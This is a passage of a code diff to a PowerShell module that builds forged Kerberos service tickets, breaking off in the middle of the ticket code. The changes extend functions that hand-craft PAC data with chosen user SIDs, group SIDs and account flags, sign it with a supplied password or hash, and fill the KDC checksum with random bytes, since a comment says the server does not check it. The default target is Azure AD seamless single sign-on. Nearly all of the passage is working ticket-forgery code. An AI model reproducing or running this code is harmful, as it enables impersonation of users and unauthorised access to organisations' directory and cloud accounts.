@@ -7,9 +7,9 @@ Function New-PAC
     Param(
         [Parameter(Mandatory=$True)]
         [String]$UserName,
-        [Parameter(Mandatory=$True)]
+        [Parameter(Mandatory=$False)]
         [String]$UserDisplayName,
-        [Parameter(Mandatory=$True)]
+        [Parameter(Mandatory=$False)]
         [String]$UserPrincipalName,
         [Parameter(Mandatory=$True)]
         [String]$ServerName,
@@ -24,8 +24,13 @@ Function New-PAC
         [Parameter(Mandatory=$False)]
         [String]$Hash,
         [Parameter(Mandatory=$True)]
-        [DateTime]$AuthTime
+        [DateTime]$AuthTime,
+        [Parameter(Mandatory=$False)]
+        [Int]$SequenceNumber=([System.Random]::new()).Next(),
 
+        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/b10cfda1-f24f-441b-8f43-80cb93e786ec
+        [Parameter(Mandatory=$False)]
+        [Int]$UserAccountControl=0x00000080 # USER_WORKSTATION_TRUST_ACCOUNT #0x00000010 <# USER_NORMAL_ACCOUNT #> -bor 0X00000200 <# USER_DONT_EXPIRE_PASSWORD #> 
     )
     
     Process
@@ -37,11 +42,11 @@ Function New-PAC
         $PwdCanChangeTime =   $PwdLastChangeTime.AddDays(1) # so we could've changed it 9 days ago
 
         # Convert names to Unicode byte strings
-        $bDomainName =        [system.text.encoding]::unicode.GetBytes($DomainName)
-        $bUserName =          [system.text.encoding]::unicode.GetBytes($UserName)
-        $bUserDisplayName =   [system.text.encoding]::unicode.GetBytes($UserDisplayName)
-        $bServerName =        [system.text.encoding]::unicode.GetBytes($ServerName)
-        $bDomainDNSName =     [system.text.encoding]::unicode.GetBytes($DomainDNSName)
+        $bDomainName =        [system.text.encoding]::unicode.GetBytes(       $DomainName)
+        $bUserName =          [system.text.encoding]::unicode.GetBytes(         $UserName) 
+        $bUserDisplayName =   [system.text.encoding]::unicode.GetBytes(  $UserDisplayName)
+        $bServerName =        [system.text.encoding]::unicode.GetBytes(       $ServerName)
+        $bDomainDNSName =     [system.text.encoding]::unicode.GetBytes(    $DomainDNSName)
         $bUserPrincipalName = [system.text.encoding]::unicode.GetBytes($UserPrincipalName)
 
         # Extract the user and domain sids
@@ -50,22 +55,22 @@ Function New-PAC
         $bDomainSid[1]=4 # Need to change from 5 to 4
 
         # Construct the PACs
-        $LOGON_INFORMATION=@(    
-            @(0x01) # Version = 0x01
-            @(0x10) # Endianness (=little endia)
-            @(0x08, 0x00) # Length = 0x08
+        $LOGON_INFORMATION=[byte[]]@(    
+            @(0x01)                   # Version = 0x01
+            @(0x10)                   # Endianness (=little endian)
+            @(0x08, 0x00)             # Length = 0x08
             @(0xCC, 0xCC, 0xCC, 0xCC) # Filler
-            @(0xC0, 0x01, 0x00, 0x00) # Length of the info buffer
+            @(0x00, 0x00, 0x00, 0x00) # Length of the info buffer (placeholder)
             @(0x00, 0x00, 0x00, 0x00) # Zeros
-            # ?
+            
             @(0x00, 0x00, 0x02, 0x00) # User info pointer
 
-            [System.BitConverter]::GetBytes($LogonTime.ToFileTimeUtc()) # LogonTime 
-            @(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F)           # LogOffTime 
-            @(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F)           # KickOffTime 
+            [System.BitConverter]::GetBytes($LogonTime.ToFileTimeUtc())         # LogonTime 
+            @(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F)                   # LogOffTime 
+            @(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F)                   # KickOffTime 
             [System.BitConverter]::GetBytes($PwdLastChangeTime.ToFileTimeUtc()) # PwdLastChangeTime
             [System.BitConverter]::GetBytes($PwdCanChangeTime.ToFileTimeUtc())  # PwdCanChangeTime
-            @(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F)           # PwdMustChangeTime
+            @(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F)                   # PwdMustChangeTime
             # UserName
                 [System.BitConverter]::GetBytes([int16]($bUserName.Length)) # Length
                 [System.BitConverter]::GetBytes([int16]($bUserName.Length)) # Max length
@@ -96,13 +101,25 @@ Function New-PAC
 
             
             $bUserSid                 # UserSid
-            @(0x01, 0x02, 0x00, 0x00) # GroupSid (Domain Users)
-            @(0x01, 0x00, 0x00, 0x00) # GroupCount
+            [System.BitConverter]::GetBytes([int32](513)) # GroupSid:
+                                                          # https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups
+                                                          # 0x0200 = 512 = Domain Admins
+                                                          # 0x0201 = 513 = Domain Users
+                                                          # 0x0202 = 514 = Domain Guests
+                                                          # 0x0203 = 515 = Domain Computers
+                                                          # 0x0204 = 516 = Domain Controllers
+                                                          # 0x0207 = 519 = Enterprise Admins
+                                                          # 0x020f = 527 = Key Admins
+                                                          # 0x0220 = 544 = Local Admins
+            @(0x02, 0x00, 0x00, 0x00) # GroupCount
             @(0x1C, 0x00, 0x02, 0x00) # GroupPointer
     
+            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/69e86ccc-85e3-41b9-b514-7d969cd0ed73
             @(0x20, 0x00, 0x00, 0x00) # UserFlags
+                                      # 0x 20 = ExtraSid is populated and contains additional SIDs
+                                      # 0x200 = ResourceGroupIds field is populated.
     
-            # SessionKey - not used anywhere
+            # UserSessionKey - used only for NTLM
             @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
     
             # ServerName
@@ -114,13 +131,13 @@ Function New-PAC
                 [System.BitConverter]::GetBytes([int16]($bDomainName.Length+2)) # MaxLength
                 @(0x24, 0x00, 0x02, 0x00)                                       # Pointer
             
-            @(0x28, 0x00, 0x02, 0x00)                         # DomainIDPointer
-            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) # Reserved = 8 x 0x00
-            @(0x10, 0x02, 0x00, 0x00)                         # UserAccountControl  
-            @(0x00, 0x00, 0x00, 0x00)                         # SubAuthStatus
-            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) # LastSuccessfullLogon
-            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) # LastFailedLogon
-            @(0x00, 0x00, 0x00, 0x00)                         # Failed Logon Count
+            @(0x28, 0x00, 0x02, 0x00)                                   # DomainIDPointer
+            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)           # Reserved = 8 x 0x00
+            [System.BitConverter]::GetBytes([int32]$UserAccountControl) # UserAccountControl 
+            @(0x00, 0x00, 0x00, 0x00)                                   # SubAuthStatus
+            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)           # LastSuccessfullLogon
+            @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)           # LastFailedLogon
+            @(0x00, 0x00, 0x00, 0x00)                                   # Failed Logon Count
 
             @(0x00, 0x00, 0x00, 0x00) # Reserved
             @(0x01, 0x00, 0x00, 0x00) # ExtraSidCount
@@ -137,14 +154,15 @@ Function New-PAC
                 [System.BitConverter]::GetBytes([int32]($bUserName.Length)/2) # used  = maxlength / 2
                 $bUserName
 
-            @(0x00, 0x00) # Null terminated string?? Align?
+            if($bUserName.Length/2 % 2 -gt 0){@(0x00, 0x00)} # Must be even sized
         
             # UserDisplayName
-                [System.BitConverter]::GetBytes([int32]($bUserDisplayName.Length)/2) # Total
+                [System.BitConverter]::GetBytes([int32]($bUserDisplayName.Length/2)) # Total
                 @(0x00, 0x00, 0x00, 0x00)                                            # Unused
-                [System.BitConverter]::GetBytes([int32]($bUserDisplayName.Length)/2) # Used
-                $bUserDisplayName
+                [System.BitConverter]::GetBytes([int32]($bUserDisplayName.Length/2)) # Used
+                if($bUserDisplayName.Length -gt 0){$bUserDisplayName}
 
+            if($bUserDisplayName.Length/2 % 2 -gt 0){@(0x00, 0x00)} # Must be even sized
             
             @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) # LogonScript
             @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) # ProfilePath
@@ -152,20 +170,23 @@ Function New-PAC
             @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) # HomeDrive
     
             # GroupSids     
-                @(0x01, 0x00, 0x00, 0x00) # Count
-                @(0x01, 0x02, 0x00, 0x00) # SidBytes
+                @(0x02, 0x00, 0x00, 0x00)                         # Count
+                @(0x03, 0x02, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00) 
+                @(0x0F, 0x02, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00) 
 
             # ServerName
-                @(0x07, 0x00, 0x00, 0x00) # Total
-                @(0x03, 0x00, 0x00, 0x00) # Unused
-                @(0x00, 0x00, 0x00, 0x00) # Used
-                @(0x02, 0x00, 0x00, 0x00) # ?????
+                [System.BitConverter]::GetBytes([int32]($bServerName.Length)/2+1) # Total
+                @(0x00, 0x00, 0x00, 0x00) # Unused
+                [System.BitConverter]::GetBytes([int32]($bServerName.Length)/2)   # Length
                 $bServerName
+
+                if($bServerName.Length/2 % 2 -gt 0){@(0x00, 0x00)} # Must be even sized
              # DomainName
-                [System.BitConverter]::GetBytes([int32]($bDomainName.Length)/2+1) # Total - Weird +1??
-                @(0x00, 0x00, 0x00, 0x00)                                         # Unused
-                [System.BitConverter]::GetBytes([int32]($bDomainName.Length)/2)   # Used
+                [System.BitConverter]::GetBytes([int32]($bDomainName.Length)/2+1) # Total
+                @(0x00, 0x00, 0x00, 0x00)                                         
+                [System.BitConverter]::GetBytes([int32]($bDomainName.Length)/2)   # Length
                 $bDomainName 
+                if($bDomainName.Length/2 % 2 -gt 0){@(0x00, 0x00)} # Must be even sized
 
             # DomainSid
                 @(0x04, 0x00, 0x00, 0x00) # Count
@@ -177,19 +198,22 @@ Function New-PAC
                 @(0x01, 0x00, 0x00, 0x00) # SidSize (count)
                 @(0x01, 0x01, 0x00, 0x00, # Sid
                   0x00, 0x00, 0x00, 0x12, 
-                  0x01, 0x00, 0x00, 0x00, 
-                  0x00, 0x00, 0x00, 0x00) 
+                  0x01, 0x00, 0x00, 0x00) 
         )
+        # Set the correct size: Total size - the header
+        $size = $LOGON_INFORMATION.Count - 16 # 
+        [Array]::Copy([bitconverter]::GetBytes([Int32]$size),0, $LOGON_INFORMATION, 8, 4)
+
         $CLIENT_NAME_TICKET_INFO=@(
             [System.BitConverter]::GetBytes($DeviceId.ToFileTime())     # ClientId - MUST be equal to authTime
             [System.BitConverter]::GetBytes([int16]($bUserName.Length)) # Name Length
             $bUserName
         )
         $UPN_DOMAIN_INFO=@(
-            @(0x38, 0x00) # UpnLength = 0x38 = 56
-            @(0x10, 0x00) # UpnOffset = 0x10 = 16
-            @(0x28, 0x00) # DnsDomainNameLength = 0x28 = 40
-            @(0x48, 0x00) # DnsDomainNameOffset = 0x48 = 72
+            [System.BitConverter]::GetBytes([int16]($bUserPrincipalName.Length))      # UpnLength
+            [System.BitConverter]::GetBytes([int16]0x10)                              # UpnOffset 
+            [System.BitConverter]::GetBytes([int16]($bDomainDNSName.Length))          # DnsDomainNameLength
+            [System.BitConverter]::GetBytes([int16]($bUserPrincipalName.Length+0x10)) # DnsDomainNameOffset 
     
             @(0x00, 0x00, 0x00, 0x00) # Flags
             @(0x00, 0x00, 0x00, 0x00) # Some align thing?
@@ -217,10 +241,10 @@ Function New-PAC
         $HEADER = @()
 
         # Align the blocks
-        $logon_info_size = Align-Size -Size $LOGON_INFORMATION.Length -Mask 8
-        $client_info_size = Align-Size -Size $CLIENT_NAME_TICKET_INFO.Length -Mask 8
-        $upn_info_size = Align-Size -Size $UPN_DOMAIN_INFO.Length -Mask 8
-        $server_check_size = Align-Size -Size (4+$SERVER_CHECKSUM.Length) -Mask 8 # Must add 4 due to the weird padding..
+        $logon_info_size =      Align-Size -Size $LOGON_INFORMATION.Length         -Mask 8
+        $client_info_size =     Align-Size -Size $CLIENT_NAME_TICKET_INFO.Length   -Mask 8
+        $upn_info_size =        Align-Size -Size $UPN_DOMAIN_INFO.Length           -Mask 8
+        $server_check_size =    Align-Size -Size $SERVER_CHECKSUM.Length           -Mask 8 
         $privilege_check_size = Align-Size -Size $PRIVILEGE_SERVER_CHECKSUM.Length -Mask 8
 
         $HEADER += @(0x05, 0x00, 0x00, 0x00) # Pac count = 5
@@ -229,22 +253,22 @@ Function New-PAC
         $HEADER += @(0x01, 0x00, 0x00, 0x00)                                 # LOGON INFO
         $HEADER += [System.BitConverter]::GetBytes([int32]$logon_info_size)  # Size 
         $HEADER += [System.BitConverter]::GetBytes([int64]$Offset)           # Offset
-        $Offset+=$LOGON_INFORMATION.Length
+        $Offset+=$logon_info_size
 
         $HEADER += @(0x0A,  0x00,  0x00,  0x00)                              # CLIENT_NAME_TICKET_INFO
         $HEADER += [System.BitConverter]::GetBytes([int32]$client_info_size) # Size
         $HEADER += [System.BitConverter]::GetBytes([int64]$Offset)           # Offset
-        $Offset+=$CLIENT_NAME_TICKET_INFO.Length
+        $Offset+=$client_info_size
 
         $HEADER += @(0x0C,  0x00,  0x00,  0x00)                              # UPN_DOMAIN_INFO
         $HEADER += [System.BitConverter]::GetBytes([int32]$upn_info_size)    # Size
         $HEADER += [System.BitConverter]::GetBytes([int64]$Offset)           # Offset
-        $Offset+=$UPN_DOMAIN_INFO.Length
+        $Offset+=$upn_info_size
     
         $HEADER += @(0x06,  0x00,  0x00,  0x00)                                 # SERVER_CHECKSUM
         $HEADER += [System.BitConverter]::GetBytes([int32]$server_check_size-4) # Size 
         $HEADER += [System.BitConverter]::GetBytes([int64]$Offset)              # Offset 
-        $Offset+=$SERVER_CHECKSUM.Length+4
+        $Offset+=$server_check_size
     
         $HEADER += @(0x07,  0x00,  0x00,  0x00)                                  # PRIVILEGE_SERVER_CHECKSUM
         $HEADER += [System.BitConverter]::GetBytes([int32]$privilege_check_size) # Size 
@@ -262,8 +286,7 @@ Function New-PAC
         $PAC += $UPN_DOMAIN_INFO 
         $PAC += Get-AlignBytes -Size $UPN_DOMAIN_INFO.Length -Mask 8
         $PAC +=  $SERVER_CHECKSUM          # KERB_CHECKSUM_HMAC_MD5
-        $PAC += @(0x00, 0x00, 0x00, 0x00)  # The weird padding..
-        $PAC += Get-AlignBytes -Size ($SERVER_CHECKSUM.Length+4) -Mask 8
+        $PAC += Get-AlignBytes -Size $SERVER_CHECKSUM.Length -Mask 8
         $PAC += $PRIVILEGE_SERVER_CHECKSUM #HMAC_SHA1_96_AES256
         $PAC += Get-AlignBytes -Size $PRIVILEGE_SERVER_CHECKSUM.Length -Mask 8
         
@@ -276,16 +299,18 @@ Function New-PAC
         {
             $checksum_key = Convert-HexToByteArray -HexString $Hash
         }
-        # Get the server checksum
+        # Checksums
         $serverChecksum = Get-ServerSignature -Key $checksum_key -Data $PAC
+        $KDCChecksum =    Get-RandomBytes -Bytes 12 # Not checked by the server, so random checksum will do
 
         # Create the signature block - Only server block gets validated in the server
         $signatureBlock = @(
             @(0x76, 0xFF, 0xFF, 0xFF) # Type = KERB_CHECKSUM_HMAC_MD5
             $serverChecksum
-            @(0x00, 0x00, 0x00, 0x00)       # Some weird padding..
+            (Get-AlignBytes -Size $SERVER_CHECKSUM.Length -Mask 8)
             @(0x10, 0x00, 0x00, 0x00)       # Type = HMAC_SHA1_96_AES256
-            (New-Guid).ToByteArray()[0..11] # Random KDC checksum
+            $KDCChecksum
+            (Get-AlignBytes -Size $PRIVILEGE_SERVER_CHECKSUM.Length -Mask 8)
         )
 
         # Add signature block to the end of the PAC
@@ -371,14 +396,53 @@ Function New-KerberosTicket
         [Parameter(Mandatory=$False)]
         [String]$Password,
         [Parameter(Mandatory=$False)]
-        [String]$Hash
+        [String]$Hash,
+        [Parameter(Mandatory=$False)]
+        [byte[]]$SessionKey=(New-Guid).ToByteArray(),
+
+
+        [Parameter(Mandatory=$False)]
+        [String]$UserName=          "UserName",
+        [Parameter(Mandatory=$False)]
+        [String]$UserDisplayName=   "DisplayName",
+        [Parameter(Mandatory=$False)]
+        [String]$UserPrincipalName= "UserName@company.com",
+        [Parameter(Mandatory=$False)]
+        [String]$ServerName=        "DC1.company.com",
+        [Parameter(Mandatory=$False)]
+        [String]$DomainName=        "COMPANY",
+        [Parameter(Mandatory=$False)]
+        [String]$Realm=             "COMPANY.COM",
+        [Parameter(Mandatory=$False)]
+        [String]$ServiceTarget = "HTTP/autologon.microsoftazuread-sso.com",
+
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('RC4','AES')]
+        [String]$Crypto="RC4",
+
+        [Parameter(Mandatory=$False)]
+        [String]$Salt,
+
+        [Parameter(Mandatory=$False)]
+        [Int]$SequenceNumber=([System.Random]::new()).Next()
+
     )
     Process
     {
         # Hash or password must be given!
         if([string]::IsNullOrEmpty($Password) -and $Hash -eq $null)
         {
-            Throw "Password of hash must be given!"
+            Throw "Password or hash must be given!"
+        }
+
+        if(![string]::IsNullOrEmpty($Salt))
+        {
+            $AESSalt = [text.encoding]::UTF8.getBytes($Salt)
+        }
+
+        if($Crypto -eq "AES" -and $AESSalt -eq $null)
+        {
+            Throw "Salt needed for AES encrypted Kerberos ticket!"
         }
 
         # Got ADUserPrincipalName so we need to try to find SID from AD
@@ -435,7 +499,7 @@ Function New-KerberosTicket
                 $sidObject = [System.Security.Principal.SecurityIdentifier]$SidString
                 $Sid = New-Object Byte[] $sidObject.BinaryLength
                 $sidObject.GetBinaryForm($Sid,0)
-                Write-Verbose "$([byte[]]$Sid | Format-Hex)"
+                Write-Verbose (Convert-ByteArrayToHex -Bytes $Sid)
             }
             catch
             {
@@ -443,19 +507,6 @@ Function New-KerberosTicket
                 return
             }
         }
-        
-        
-
-        # Init the parameters
-        # Azure AD doesn't care about these at all, so can be anything. Only thing that matters is the sid.
-        # Currently the sizes MUST match the strings below as PAC creation is not parametrized - lazy me :)
-        $UserName=          "XXXXXXX"
-        $UserDisplayName=   "XXXXXXXXXXXX"
-        $UserPrincipalName= "XXXXXXXXXXXXXXXXXXXXXXXXXXXX"
-        $ServerName=        "XX"
-        $DomainName=        "XXXXXXXx"
-        $Realm=             "XXXXXXXXXXXXXXXXXXXX"
-        $SessionKey=        (New-Guid).ToByteArray()
 
         # KRB_AP_REQ
         # Set the times
@@ -468,18 +519,25 @@ Function New-KerberosTicket
         $cTime = Get-Date
         
 
-        $machineId = (New-Guid).ToByteArray() + (New-Guid).ToByteArray()
-        $kerbLocal1 = (New-Guid).ToByteArray()
-        $kerbLocal2 = (New-Guid).ToByteArray()
+        $machineId =  Get-RandomBytes -Bytes 32
+        $kerbLocal1 = Get-RandomBytes -Bytes 16
+        $kerbLocal2 = Get-RandomBytes -Bytes 16
 
         # The ticket
         $ticket=Add-DERTag -Tag 0x63 -Data @(
-            Add-DERTag -Tag 0x30 -Data @(
-            Add-DERTag -Tag 0xA0 -Data @(Add-DERTag -Tag 0x03 -Data @(0x00, 0x40, 0xA1, 0x00, 0x00)) #Flags
-            # Encryption key
+            Add-DERSequence -Data @(
+            Add-DERTag -Tag 0xA0 -Data @(Add-DERTag -Tag 0x03 -Data @(0x00, 0x40, 0xA1, 0x00, 0x00)) #Flags 100 0000 1010 0001 old
+            # Encryption key                                                                                100 0000 0010 0001 new
             Add-DERTag -Tag 0xA1 -Data @(
-                Add-DERTag -Tag 0x30 -Data @(
-                    Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17)) 
+                Add-DERSequence -Data @(
+                    if($Crypto -eq "RC4")
+                    {
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17)) # rc4-hmac
+                    }
+                    elseif($Crypto -eq "AES")
+                    {
+                        Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x12)) # aes256-cts-hmac-sha1-96
+                    }
                     Add-DERTag -Tag 0xA1 -Data @(
                         Add-DERTag -Tag 0x04 -Data $SessionKey # Session key
                     )
@@ -488,15 +546,15 @@ Function New-KerberosTicket
             # Realm
             Add-DERTag -Tag 0xA2 -Data @(Add-DERUtf8String($Realm))
             Add-DERTag -Tag 0xA3 -Data @( # CName
-                Add-DERTag -Tag 0x30 -Data @(
+                Add-DERSequence -Data @(
                     Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01)) # NT_PRINCIPAL
                     Add-DERTag -Tag 0xA1 -Data @(
-                        Add-DERTag -Tag 0x30 -Data @(Add-DERUtf8String($UserName))
+                        Add-DERSequence -Data @(Add-DERUtf8String($UserName))
                     )
                 )
             )
             Add-DERTag -Tag 0xA4 -Data @(
-                Add-DERTag -Tag 0x30 -Data @(
+                Add-DERSequence -Data @(
                     Add-DERTag -Tag 0xA0 -data @(Add-DERInteger -Data @(0x01))
                     Add-DERTag -Tag 0xA1 -Data @(0x04,0x00) # Empty octect string: CAddr
                 )
@@ -507,20 +565,20 @@ Function New-KerberosTicket
             Add-DERTag -Tag 0xA7 -Data @(Add-DERDate -Date $endTime) # Generalized time: EndTime
             Add-DERTag -Tag 0xA8 -Data @(Add-DERDate -Date $renewTime) # Generalized time: RenewTill
             Add-DERTag -Tag 0xAA -Data @(
-                Add-DERTag -Tag 0x30 -Data @(
-                    Add-DERTag -Tag 0x30 -Data @(
+                Add-DERSequence -Data @(
+                    Add-DERSequence -Data @(
 
                     Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01)) # ADIfRelevant
                     Add-DERTag -Tag 0xA1 -Data @(
                         Add-DERTag -Tag 0x04 -Data @(
-                            Add-DERTag -Tag 0x30 -Data @(
-                                Add-DERTag -Tag 0x30 -Data @(
+                            Add-DERSequence -Data @(
+                                Add-DERSequence -Data @(
                                     Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x80)) # PAC type = AdWin2kPac
                                     Add-DERTag -Tag 0xA1 -Data @(
                                     
                                         Add-DERTag -Tag 0x04 -Data @(
                                             # Generate PAC
-                                            [byte[]](New-Pac -UserName $UserName -UserDisplayName $UserDisplayName -UserPrincipalName $UserPrincipalName -ServerName $ServerName -DomainName $DomainName -DomainDNSName $Realm -Sid $Sid -Password $Password -Hash $Hash -AuthTime $authTime )) 
+                                            [byte[]](New-Pac -UserName $UserName -UserDisplayName $UserDisplayName -UserPrincipalName $UserPrincipalName -ServerName $ServerName -DomainName $DomainName -DomainDNSName $Realm -Sid $Sid -Password $Password -Hash $Hash -AuthTime $authTime -SequenceNumber $SequenceNumber)) 
                                     )
                                 )
                             )
@@ -528,18 +586,18 @@ Function New-KerberosTicket
                         )
                     )
                 )
-                    Add-DERTag -Tag 0x30 -Data @(
+                    Add-DERSequence -Data @(
                     Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01)) 
                     Add-DERTag -Tag 0xA1 -Data @(
                         Add-DERTag -Tag 0x04 -Data @(
 
-                            Add-DERTag -Tag 0x30 -Data @(
-                                Add-DERTag -Tag 0x30 -Data @( 
+                            Add-DERSequence -Data @(
+                                Add-DERSequence -Data @( 
                                     Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8D)) # KERB_AUTH_DATA_TOKEN_RESTRICTIONS
                                     Add-DERTag -Tag 0xA1 -Data @( 
                                         Add-DERTag -Tag 0x04 -Data @( # Octet string
-                                            Add-DERTag -Tag 0x30 -Data @(
-                                                Add-DERTag -Tag 0x30 -Data @(
+                                            Add-DERSequence -Data @(
+                                                Add-DERSequence -Data @(
                                                     Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00)) # Restrictiontype, must be 0x00
                                                     Add-DERTag -Tag 0xA1 -Data @(
                                                         Add-DERTag -Tag 0x04 -Data @(
@@ -564,7 +622,7 @@ Function New-KerberosTicket
 
                                 )
                             
-                                Add-DERTag -Tag 0x30 -Data @(
+                                Add-DERSequence -Data @(
                                     Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x8E))
                                     # KerbLocal
                                     Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data $kerbLocal1)
@@ -579,26 +637,27 @@ Function New-KerberosTicket
             )
         )
         )
-
-        $encryptedTicket = Encrypt-Kerberos -Data $ticket -Password $Password -Hash $Hash
-        
+        $encryptionKey = New-KerberosKey -Password $Password -Hash $Hash -Crypto $Crypto
+        $encryptedTicket = Encrypt-Kerberos -Data $ticket -Type Ticket -Salt $AESSalt -Crypto $Crypto -Key $encryptionKey
     
         $authenticator=Add-DERTag -Tag 0x62 -Data @(
-            Add-DERTag -Tag 0x30 -Data @(
+            Add-DERSequence -Data @(
                 Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x05))
                 Add-DERTag -Tag 0xA1 -Data @(Add-DERUtf8String -Text $Realm -Tag 0x1B)
                 Add-DERTag -Tag 0xA2 -Data @(
-                    Add-DERTag -Tag 0x30 -Data @(
+                    Add-DERSequence -Data @(
                         Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01))
                         Add-DERTag -Tag 0xa1 -Data @(
-                            Add-DERTag -Tag 0x30 -Data @(
+                            Add-DERSequence -Data @(
                                 Add-DERUtf8String -Text $UserName -Tag 0x1B
                             )
                         )
                     )
                 )
                 Add-DERTag -Tag 0xA3 -Data @(
-                    Add-DERTag -Tag 0x30 -Data @(
+                    # Authenticator checksum
+                    # https://tools.ietf.org/html/rfc4121#page-6
+                    Add-DERSequence -Data @(
                         Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x80, 0x03)) # Checksum type 32771 = KRBv5
                         # Checksum https://tools.ietf.org/html/rfc4121#section-4.1.1
                         Add-DERTag -Tag 0xA1 -Data @(
@@ -606,52 +665,72 @@ Function New-KerberosTicket
                                 # Length = 0x10 = 16
                                 @(0x10, 0x00, 0x00, 0x00)
                                 # Binding information
-                                @(0xEB, 0xA3, 0x9C, 0x9C, 0xE8, 0xFA, 0x90, 0xC3, 0x36, 0x27, 0x63, 0x7B, 0x40, 0x69, 0x18, 0x7D)
+                                @(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
+                                
                                 # Flags
-                                @(0x22, 0x00, 0x00, 0x00)
+                                # https://tools.ietf.org/html/rfc2744
+                                # GSS_C_DELEG_FLAG            0x01       1
+                                # GSS_C_MUTUAL_FLAG           0x02       2
+                                # GSS_C_REPLAY_FLAG           0x04       4
+                                # GSS_C_SEQUENCE_FLAG         0x08       8
+                                # GSS_C_CONF_FLAG             0x10      16
+                                # GSS_C_INTEG_FLAG            0x20      32
+                                # GSS_C_ANON_FLAG             0x40      64
+                                # GSS_C_PROT_READY_FLAG       0x80     128
+
+                                # GSS_C_TRANS_FLAG           0x100     256
+
+                                # GSS_C_DCE_STYLE           0x1000    4096
+                                # GSS_C_IDENTIFY_FLAG       0x2000    8192
+                                # GSS_C_EXTENDED_ERROR_FLAG 0x4000   16384
+                                # GSS_C_DELEG_POLICY_FLAG   0x8000   32768
+
+                                @(0x3E, 0x20, 0x00, 0x00)
+
+                                
                             )
                         )
                     )
                 )
-                Add-DERTag -Tag 0xA4 -Data @(Add-DERInteger -Data (0x2b)) # Cusec = milliseconds part of authTime -- for replay detection, so can be anything
-                Add-DERTag -Tag 0xA5 -Data @(Add-DERDate -Date $cTime) # CTime
+                Add-DERTag -Tag 0xA4 -Data @(Add-DERInteger -Data (0x01)) # Cusec = milliseconds part of authTime -- for replay detection, so can be anything
+                Add-DERTag -Tag 0xA5 -Data @(Add-DERDate    -Date $cTime) # CTime
 
                 
                 Add-DERTag -Tag 0xA6 -Data @(
-                    Add-DERTag -Tag 0x30 -Data @(
+                    Add-DERSequence -Data @(
                         Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x17)) # Subkey - not used here to anything
                         Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data (New-Guid).ToByteArray())
                     )
                 )
-                Add-DERTag -Tag 0xA7 -Data @(Add-DERInteger -Data @([System.BitConverter]::GetBytes(([System.Random]::new()).Next())) ) # Sequence number
+                Add-DERTag -Tag 0xA7 -Data @(Add-DERInteger -Data @([System.BitConverter]::GetBytes($SequenceNumber)) ) # Sequence number
                 
                 Add-DERTag -Tag 0xA8 -Data @(
-                        Add-DERTag -Tag 0x30 -Data @(
-                            Add-DERTag -Tag 0x30 -Data @(
+                        Add-DERSequence -Data @(
+                            Add-DERSequence -Data @(
                                 Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x01))
                                 Add-DERTag -Tag 0xA1 -Data @(
                                     Add-DERTag -Tag 0x04 -Data @(
-                                        Add-DERTag -Tag 0x30 -Data @(
-                                                Add-DERTag -Tag 0x30 -Data @(
+                                        Add-DERSequence -Data @(
+                                                Add-DERSequence -Data @(
                                                     Add-DERTag -Tag 0xA0 -Data @(Add-DERInteger -Data @(0x00, 0x81))
 
                                                     # AdETypeNegotiation
                                                     Add-DERTag -Tag 0xA1 -Data @(Add-DERTag -Tag 0x04 -Data @(
-                                                        Add-DERTag -Tag 0x30 -Data @(
-                                                                Add-DERInteger -Data @(0x12) # AES256_CTS_HMAC_SHA1_96
-                                                                Add-DERInteger -Data @(0x11) # AES128_CTS_HMAC_SHA1_96
+                                                        Add-DERSequence -Data @(
